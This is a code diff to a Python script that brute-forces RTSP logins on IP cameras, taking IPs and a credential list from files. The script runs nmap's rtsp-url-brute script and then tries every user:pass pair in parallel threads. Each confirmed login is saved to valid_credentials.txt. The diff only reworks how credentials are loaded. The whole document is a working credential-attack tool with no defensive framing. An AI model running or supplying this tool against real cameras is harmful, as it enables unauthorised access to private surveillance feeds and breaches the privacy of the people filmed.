@@ -2,7 +2,7 @@ import os
 import subprocess
 import threading
 import queue
-import random
+import time
 
 def run_nmap(ip):
     """Runs Nmap with the rtsp-url-brute script on the given IP and saves the output."""
@@ -24,21 +24,21 @@ def verify_success(ip, username, password):
         if "Unauthorized" in result.stderr or "Invalid data found" in result.stderr or "Connection refused" in result.stderr:
             print(f"[-] False positive: {rtsp_url} (Verification failed)")
             return False
-        
+
         print(f"[+] CONFIRMED SUCCESS: {rtsp_url}")
         with open("valid_credentials.txt", "a") as f:
             f.write(f"{ip} {username}:{password}\n")
         return True
     except subprocess.TimeoutExpired:
         print(f"[-] Verification timeout: {rtsp_url}")
-    
+
     return False
 
 def attempt_login(ip, username, password, found_event):
     """Attempts RTSP login and verifies success."""
     if found_event.is_set():
         return  # Stop if success is already found
-    
+
     rtsp_url = f"rtsp://{username}:{password}@{ip}:554/"
     print(f"[*] Trying {rtsp_url}")
 
@@ -75,7 +75,8 @@ def brute_force_rtsp(ip, creds):
     found_event = threading.Event()
 
     # Populate the queue with all username-password combinations
-    for username, password in creds:
+    for cred in creds:
+        username, password = cred.split(":", 1)
         creds_queue.put((username, password))
 
     # Launch threads
@@ -91,28 +92,6 @@ def brute_force_rtsp(ip, creds):
     for thread in threads:
         thread.join()
 
-def load_credentials(creds_file):
-    """Loads credentials, supporting both formats:
-    1. username:password (per line)
-    2. Separate username and password lists (one per line, combined randomly)
-    """
-    with open(creds_file, "r") as f:
-        lines = [line.strip() for line in f if line.strip()]
-
-    if any(":" in line for line in lines):
-        # Format: username:password per line
-        return [line.split(":", 1) for line in lines]
-    else:
-        # Format: Separate username & password lists
-        usernames = lines[:len(lines)//2]  # First half as usernames
-        passwords = lines[len(lines)//2:]  # Second half as passwords
-        random.shuffle(usernames)
-        random.shuffle(passwords)
-
-        # Combine randomly
-        creds = [(random.choice(usernames), random.choice(passwords)) for _ in range(len(usernames) * len(passwords))]
-        return creds
-
 def worker(ip, creds):
     run_nmap(ip)
     brute_force_rtsp(ip, creds)
@@ -127,8 +106,8 @@ def main(ip_list_file, creds_file):
 
     with open(ip_list_file, "r") as f:
         ips = [line.strip() for line in f if line.strip()]
-    
-    creds = load_credentials(creds_file)
+    with open(creds_file, "r") as f:
+        creds = [line.strip() for line in f if ":" in line]
 
     threads = []
     for ip in ips:
@@ -141,5 +120,5 @@ def main(ip_list_file, creds_file):
 
 if __name__ == "__main__":
     ip_list = "ips.txt"  # List of IPs, one per line
-    creds_list = "creds.txt"  # List of credentials
+    creds_list = "creds.txt"  # List of credentials in user:pass format
     main(ip_list, creds_list)
